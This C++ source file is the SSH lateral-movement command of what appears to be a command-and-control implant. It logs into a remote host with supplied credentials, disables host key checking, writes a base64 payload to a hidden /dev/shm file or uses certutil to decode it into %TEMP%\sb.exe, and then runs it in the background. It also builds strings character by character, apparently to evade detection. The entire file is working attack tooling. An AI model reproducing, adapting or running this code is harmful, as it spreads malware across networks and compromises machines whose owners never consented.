#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_SSH

using namespace stardust;
using namespace starburst;

static bool pipe_write(instance& inst, HANDLE pipe, const char* data, uint32_t len) {
    DWORD written = 0;
    uint32_t total = 0;
    while (total < len) {
        if (!inst.kernel32.WriteFile(pipe, data + total, len - total, &written, nullptr))
            return false;
        total += written;
    }
    return true;
}

static bool pipe_write_str(instance& inst, HANDLE pipe, const char* str) {
    return pipe_write(inst, pipe, str, str_len(str));
}

static void deploy_linux(
    instance& inst, HANDLE h_stdin_write,
    const char* binary_b64, uint32_t binary_b64_len
) {
    char nl = '\n';

    char bin_cmd1[] = "base64 -d << 'STARBURST_BIN_EOF' > /dev/shm/.sb\n";
    char bin_cmd2[] = "STARBURST_BIN_EOF\n";

    pipe_write_str(inst, h_stdin_write, bin_cmd1);

    uint32_t b64_off = 0;
    while (b64_off < binary_b64_len) {
        uint32_t chunk = binary_b64_len - b64_off;
        if (chunk > 76) chunk = 76;
        pipe_write(inst, h_stdin_write, binary_b64 + b64_off, chunk);
        pipe_write(inst, h_stdin_write, &nl, 1);
        b64_off += chunk;
    }
    pipe_write_str(inst, h_stdin_write, bin_cmd2);

    LARGE_INTEGER delay;
    delay.QuadPart = -20000000LL; // 2s
    inst.ntdll.NtDelayExecution(FALSE, &delay);

    char exec_cmd[] = "chmod +x /dev/shm/.sb && nohup /dev/shm/.sb >/dev/null 2>&1 &\n";
    pipe_write_str(inst, h_stdin_write, exec_cmd);

    delay.QuadPart = -10000000LL; // 1s
    inst.ntdll.NtDelayExecution(FALSE, &delay);

    char check_cmd[] = "echo DEPLOY_STATUS=$?\n";
    pipe_write_str(inst, h_stdin_write, check_cmd);

    delay.QuadPart = -10000000LL;
    inst.ntdll.NtDelayExecution(FALSE, &delay);
}

static void deploy_windows(
    instance& inst, HANDLE h_stdin_write,
    const char* binary_b64, uint32_t binary_b64_len
) {
    char nl = '\n';
    LARGE_INTEGER delay;

    /* force cmd.exe shell regardless of default SSH shell (handles PS default) */
    char cmd_shell[] = "cmd.exe\n";
    pipe_write_str(inst, h_stdin_write, cmd_shell);
    delay.QuadPart = -10000000LL; // 1s
    inst.ntdll.NtDelayExecution(FALSE, &delay);

    /* write BEGIN marker for certutil */
    /* [MALLEABLE] change path from %TEMP% to desired drop location */
    char hdr_cmd[] = "echo -----BEGIN CERTIFICATE----->%TEMP%\\sb.b64\n";
    pipe_write_str(inst, h_stdin_write, hdr_cmd);

    /* write base64 data in 76-char lines via echo >> */
    char echo_prefix[] = "echo ";
    char redir_append[] = ">>%TEMP%\\sb.b64\n";

    uint32_t b64_off = 0;
    while (b64_off < binary_b64_len) {
        uint32_t chunk = binary_b64_len - b64_off;
        if (chunk > 76) chunk = 76;

        pipe_write_str(inst, h_stdin_write, echo_prefix);
        pipe_write(inst, h_stdin_write, binary_b64 + b64_off, chunk);
        pipe_write_str(inst, h_stdin_write, redir_append);
        b64_off += chunk;
    }

    /* write END marker */
    char ftr_cmd[] = "echo -----END CERTIFICATE----->>%TEMP%\\sb.b64\n";
    pipe_write_str(inst, h_stdin_write, ftr_cmd);

    delay.QuadPart = -20000000LL; // 2s
    inst.ntdll.NtDelayExecution(FALSE, &delay);

    /* decode with certutil */
    /* [MALLEABLE] change sb.exe to desired filename */
    char decode_cmd[] = "certutil -decode %TEMP%\\sb.b64 %TEMP%\\sb.exe >nul 2>&1\n";
    pipe_write_str(inst, h_stdin_write, decode_cmd);

    delay.QuadPart = -20000000LL; // 2s
    inst.ntdll.NtDelayExecution(FALSE, &delay);

    /* cleanup b64 file */
    char del_cmd[] = "del %TEMP%\\sb.b64\n";
    pipe_write_str(inst, h_stdin_write, del_cmd);

    /* execute payload */
    char exec_cmd[] = "start \"\" /b %TEMP%\\sb.exe\n";
    pipe_write_str(inst, h_stdin_write, exec_cmd);

    delay.QuadPart = -10000000LL; // 1s
    inst.ntdll.NtDelayExecution(FALSE, &delay);

    char check_cmd[] = "echo DEPLOY_STATUS=%ERRORLEVEL%\n";
    pipe_write_str(inst, h_stdin_write, check_cmd);

    delay.QuadPart = -10000000LL;
    inst.ntdll.NtDelayExecution(FALSE, &delay);

    /* exit cmd.exe (back to SSH shell) */
    char exit_cmd_shell[] = "exit\n";
    pipe_write_str(inst, h_stdin_write, exit_cmd_shell);
}

auto declfn starburst::cmd_ssh(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t host_len = 0;
    auto hostname = parser_string(params, &host_len);
    uint32_t port = parser_int32(params);
    uint32_t user_len = 0;
    auto username = parser_string(params, &user_len);
    uint32_t cred_len = 0;
    auto credential = parser_string(params, &cred_len);
    uint8_t use_key = parser_byte(params);
    uint8_t target_os = parser_byte(params);
    uint32_t binary_b64_len = 0;
    auto binary_b64 = parser_string(params, &binary_b64_len);

    if (!hostname || host_len == 0 || !username || user_len == 0) {
        queue_response(inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>(const_cast<char*>("missing hostname or username")));
        return;
    }

    if (!binary_b64 || binary_b64_len == 0) {
        queue_response(inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>(const_cast<char*>("missing payload binary")));
        return;
    }

    char host_buf[256] = {};
    char user_buf[128] = {};
    char cred_buf[256] = {};
    if (host_len >= 256) host_len = 255;
    if (user_len >= 128) user_len = 127;
    if (cred_len >= 256) cred_len = 255;
    memory::copy(host_buf, hostname, host_len);
    memory::copy(user_buf, username, user_len);
    if (credential && cred_len > 0) {
        memory::copy(cred_buf, credential, cred_len);
    }

    /* create pipes for ssh.exe stdin/stdout */
    SECURITY_ATTRIBUTES sa = {};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE h_stdin_read = nullptr, h_stdin_write = nullptr;
    HANDLE h_stdout_read = nullptr, h_stdout_write = nullptr;

    if (!inst.kernel32.CreatePipe(&h_stdin_read, &h_stdin_write, &sa, 0)) {
        queue_response(inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>(const_cast<char*>("stdin pipe failed")));
        return;
    }
    if (!inst.kernel32.CreatePipe(&h_stdout_read, &h_stdout_write, &sa, 0)) {
        inst.kernel32.CloseHandle(h_stdin_read);
        inst.kernel32.CloseHandle(h_stdin_write);
        queue_response(inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>(const_cast<char*>("stdout pipe failed")));
        return;
    }

    /* build ssh.exe command line */
    char cmdline[1024] = {};
    wchar_t wcmdline[1024] = {};
    uint32_t off = 0;

    char ssh_exe[] = { 's', 's', 'h', '.', 'e', 'x', 'e', 0 };
    char opt_nocheck[] = { ' ', '-', 'o', ' ', 'S', 't', 'r', 'i', 'c', 't',
        'H', 'o', 's', 't', 'K', 'e', 'y', 'C', 'h', 'e', 'c', 'k', 'i',
        'n', 'g', '=', 'n', 'o', 0 };
    char opt_tt[] = { ' ', '-', 't', 't', 0 };

    uint32_t slen = str_len(ssh_exe);
    memory::copy(cmdline + off, ssh_exe, slen); off += slen;
    slen = str_len(opt_nocheck);
    memory::copy(cmdline + off, opt_nocheck, slen); off += slen;
    slen = str_len(opt_tt);
    memory::copy(cmdline + off, opt_tt, slen); off += slen;

    if (use_key) {
        char opt_i[] = { ' ', '-', 'i', ' ', 0 };
        slen = str_len(opt_i);
        memory::copy(cmdline + off, opt_i, slen); off += slen;
        slen = str_len(cred_buf);
        memory::copy(cmdline + off, cred_buf, slen); off += slen;
    }

    char opt_p[] = { ' ', '-', 'p', ' ', 0 };
    slen = str_len(opt_p);
    memory::copy(cmdline + off, opt_p, slen); off += slen;
    char port_str[8] = {};
    int_to_str(port_str, port, 10);
    slen = str_len(port_str);
    memory::copy(cmdline + off, port_str, slen); off += slen;

    cmdline[off++] = ' ';
    slen = str_len(user_buf);
    memory::copy(cmdline + off, user_buf, slen); off += slen;
    cmdline[off++] = '@';
    slen = str_len(host_buf);
    memory::copy(cmdline + off, host_buf, slen); off += slen;
    cmdline[off] = 0;

    inst.kernel32.MultiByteToWideChar(65001, 0, cmdline, -1, wcmdline, 1024);

    STARTUPINFOW si = {};
    si.cb = sizeof(STARTUPINFOW);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = h_stdin_read;
    si.hStdOutput = h_stdout_write;
    si.hStdError = h_stdout_write;

    PROCESS_INFORMATION pi = {};
    BOOL created = inst.kernel32.CreateProcessW(
        nullptr, wcmdline, nullptr, nullptr, TRUE,
        0x08000000, nullptr, nullptr, &si, &pi);

    inst.kernel32.CloseHandle(h_stdin_read);
    inst.kernel32.CloseHandle(h_stdout_write);

    if (!created) {
        inst.kernel32.CloseHandle(h_stdin_write);
        inst.kernel32.CloseHandle(h_stdout_read);
        queue_response(inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>(const_cast<char*>("ssh.exe launch failed")));
        return;
    }
    inst.kernel32.CloseHandle(pi.hThread);

    /* if password auth, wait for prompt and send password */
    if (!use_key && str_len(cred_buf) > 0) {
        LARGE_INTEGER delay;
        delay.QuadPart = -30000000LL; // 3s
        inst.ntdll.NtDelayExecution(FALSE, &delay);

        pipe_write_str(inst, h_stdin_write, cred_buf);
        char nl = '\n';
        pipe_write(inst, h_stdin_write, &nl, 1);
    }

    /* wait for shell prompt after login */
    LARGE_INTEGER login_delay;
    login_delay.QuadPart = -20000000LL; // 2s
    inst.ntdll.NtDelayExecution(FALSE, &login_delay);

    /* deploy based on target OS - 0=linux, 1=windows */
    if (target_os == 0) {
        deploy_linux(inst, h_stdin_write, binary_b64, binary_b64_len);
    } else {
        deploy_windows(inst, h_stdin_write, binary_b64, binary_b64_len);
    }

    /* exit ssh session */
    char exit_cmd[] = "exit\n";
    pipe_write_str(inst, h_stdin_write, exit_cmd);

    /* wait for ssh.exe to exit (max 60s - Windows deploy is slower) */
    inst.kernel32.WaitForSingleObject(pi.hProcess, 60000);

    /* read any output */
    char output[4096] = {};
    DWORD avail = 0;
    DWORD bytes_read = 0;
    if (inst.kernel32.PeekNamedPipe(h_stdout_read, nullptr, 0, nullptr, &avail, nullptr) && avail > 0) {
        uint32_t to_read = avail < 4000 ? avail : 4000;
        inst.kernel32.ReadFile(h_stdout_read, output, to_read, &bytes_read, nullptr);
        output[bytes_read] = 0;
    }

    inst.kernel32.CloseHandle(h_stdin_write);
    inst.kernel32.CloseHandle(h_stdout_read);
    inst.kernel32.TerminateProcess(pi.hProcess, 0);
    inst.kernel32.CloseHandle(pi.hProcess);

    /* build result message */
    char result[512] = {};
    uint32_t roff = 0;
    char msg_deployed[] = { 'D', 'e', 'p', 'l', 'o', 'y', 'e', 'd', ' ',
        'a', 'g', 'e', 'n', 't', ' ', 't', 'o', ' ', 0 };
    slen = str_len(msg_deployed);
    memory::copy(result + roff, msg_deployed, slen); roff += slen;
    memory::copy(result + roff, user_buf, str_len(user_buf)); roff += str_len(user_buf);
    result[roff++] = '@';
    memory::copy(result + roff, host_buf, str_len(host_buf)); roff += str_len(host_buf);
    result[roff++] = ':';
    memory::copy(result + roff, port_str, str_len(port_str)); roff += str_len(port_str);

    if (target_os == 0) {
        char msg_path[] = { ' ', '(', '/', 'd', 'e', 'v', '/', 's', 'h', 'm',
            '/', '.', 's', 'b', ')', 0 };
        slen = str_len(msg_path);
        memory::copy(result + roff, msg_path, slen); roff += slen;
    } else {
        char msg_path[] = { ' ', '(', '%', 'T', 'E', 'M', 'P', '%', '\\',
            's', 'b', '.', 'e', 'x', 'e', ')', 0 };
        slen = str_len(msg_path);
        memory::copy(result + roff, msg_path, slen); roff += slen;
    }
    result[roff] = 0;

    queue_response(inst, task_uuid, RESPONSE_SUCCESS, result);
}

#endif
